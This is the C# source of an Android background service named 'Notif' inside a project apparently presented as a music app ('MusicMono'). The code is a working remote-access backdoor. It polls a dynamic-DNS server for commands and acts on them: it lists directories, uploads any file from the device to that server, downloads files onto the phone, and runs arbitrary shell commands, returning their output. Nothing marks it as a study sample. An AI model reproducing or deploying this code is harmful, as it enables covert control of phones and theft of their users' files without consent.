using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.Threading;


using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;

using Java.IO;

namespace MusicMono
{
    [Service]
    [IntentFilter(new string[] { "com.MonoMusic.Notif" })]
    public class Notif : Service
    {
        Queue<string> tasks;
        //public Notif () : base("Notif")
        //{
        //}
        [return: GeneratedEnum]
        public override StartCommandResult OnStartCommand(Intent intent, [GeneratedEnum] StartCommandFlags flags, int startId)
        {
            base.OnStartCommand(intent, flags, startId);
            tasks = new Queue<string>();
            Task t = GetComands();
            return StartCommandResult.Sticky;
        }
        public override IBinder OnBind(Intent intent)
        {
            return null;
        }

        //protected async override void OnHandleIntent(Intent intent)
        //{
        //    Toast.MakeText(this, "hello", ToastLength.Short);
        //    Task t = GetComands();
        //    tasks = new Queue<string>();
        //    await t;
        //}

        async private Task GetComands()
        {
            string myId = string.Empty;

            while (true)
            {
                
                try
                {
                    string address = "http://xoxoxoms.ddns.net:45678/main/" + myId;
                    var req = new HttpWebRequest(new Uri(address));
                    if (tasks.Count > 0)
                    {
                        string curtask = tasks.Dequeue();
                        string[] comandsAndArgs = curtask.Split(' ');
                        string comand = comandsAndArgs[0];
                        string args = string.Empty;
                        for (int i = 1; i < comandsAndArgs.Length; i++)
                        {
                            args += comandsAndArgs[i] + " ";
                        }
                        args = args.Remove(args.Length - 1);
                        switch (comand.ToLower())
                        {
                            case "dir":
                                try
                                {
                                    string dirCont = string.Empty;
                                    File f = new File("/" + args);
                                    File[] flist = await f.ListFilesAsync();
                                    dirCont += string.Format("{0} \n{1} subfiles with total size {2}MB:\n", f.AbsolutePath, flist.Length, (f.TotalSpace >> 20));
                                    foreach (File c in flist)
                                    {
                                        dirCont += string.Format("  {0}  -  {1}MB\n", c.Name, c.Length() >> 20);
                                    }
                                    using (var wc = new WebClient())
                                    {
                                        wc.Headers.Add("len", Encoding.UTF8.GetByteCount(dirCont).ToString());
                                        wc.Headers.Add("id", myId);
                                        wc.Headers.Add("func", "dir");
                                        await wc.UploadStringTaskAsync(address, dirCont);
                                    }
                                }catch(Exception ex)
                                {
                                    PhraseTasks(string.Format("eror {0}", ex));
                                }
                                    break;
                            case "get":
                                try
                                {
                                    using (File sendF = new File("/" + args))
                                    {
                                        using (var wc = new WebClient())
                                        {
                                            wc.Headers.Add("len", sendF.Length().ToString());
                                            wc.Headers.Add("id", myId);
                                            wc.Headers.Add("func", "document");
                                            wc.Headers.Add("FileName", sendF.Name);
                                            await wc.UploadFileTaskAsync(address,"STOR", sendF.AbsolutePath);
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                    PhraseTasks(string.Format("eror {0}", ex));
                                }
                                break;
                            case "push":
                                try
                                {
                                    string fileName = args.Split('\\').Last().Replace("\"",string.Empty);
                                    using (var wc = new WebClient())
                                    {
                                        wc.Headers.Add("path", args);
                                        wc.Headers.Add("func", "needfile");
                                        await wc.DownloadFileTaskAsync(address,System.IO.Path.Combine(Android.OS.Environment.ExternalStorageDirectory.Path, "Download", fileName));
                                    }
                                }
                                catch (Exception ex)
                                {
                                    PhraseTasks(string.Format("eror {0}", ex));
                                }
                                break;
                            case "eror":
                                using (var wc = new WebClient())
                                {
                                    wc.Headers.Add("len", Encoding.UTF8.GetByteCount(args.ToString()).ToString());
                                    wc.Headers.Add("id", myId);
                                    wc.Headers.Add("func", "eror");
                                    await wc.UploadStringTaskAsync(address, args);
                                }
                                break;
                            case "eval":
                                using (Java.Lang.Process su = Java.Lang.Runtime.GetRuntime().Exec("sh"))
                                {
                                    var OutStream = su.InputStream;
                                    var InStream = su.OutputStream;
                                    byte[] buff = Encoding.UTF8.GetBytes(args + "\nexit\n");
                                    await InStream.WriteAsync(buff, 0, buff.Length);
                                    await InStream.FlushAsync();
                                    await su.WaitForAsync();
                                    var read = new BufferedReader(new InputStreamReader(OutStream));
                                    using (var wc = new WebClient())
                                    {
                                        string outstr = string.Empty;
                                        string addstring = string.Empty;
                                        while (!string.IsNullOrWhiteSpace(addstring = read.ReadLine()))
                                        {
                                            outstr += addstring + '\n';
                                        }
                                        wc.Headers.Add("len", (outstr.Length * sizeof(char)).ToString());
                                        wc.Headers.Add("id", myId);
                                        wc.Headers.Add("func", "eval");
                                        await wc.UploadStringTaskAsync(address, outstr);
                                        
                                    }
                                }
                                break;
                                
                            default:
                                throw new Exception(string.Format("{0} Not implemented", comand));

                              
                        }
                    }else
                        req.ContentType = "nothing";
                    req.Headers.Add("id", myId);
                    req.Timeout = 2000;
                    using (var res = await req.GetResponseAsync())
                    {
                        if (myId == string.Empty)
                            myId = res.Headers["id"];
                        else
                        {
                            PhraseTasks(res.Headers["task"]);
                        }

                    }

                }
                catch(Exception ex) {
                    if (ex.ToString().Contains("implemented"))
                    {
                        PhraseTasks(string.Format("eror {0}", ex));
                    }
                }
                await Task.Delay(500);
            }
        }

        private void PhraseTasks(string Tasks)
        {
            foreach(string s in Tasks.Split(new string[] { ";" }, StringSplitOptions.RemoveEmptyEntries))
            {
                tasks.Enqueue(s);
            }
        }
    }
}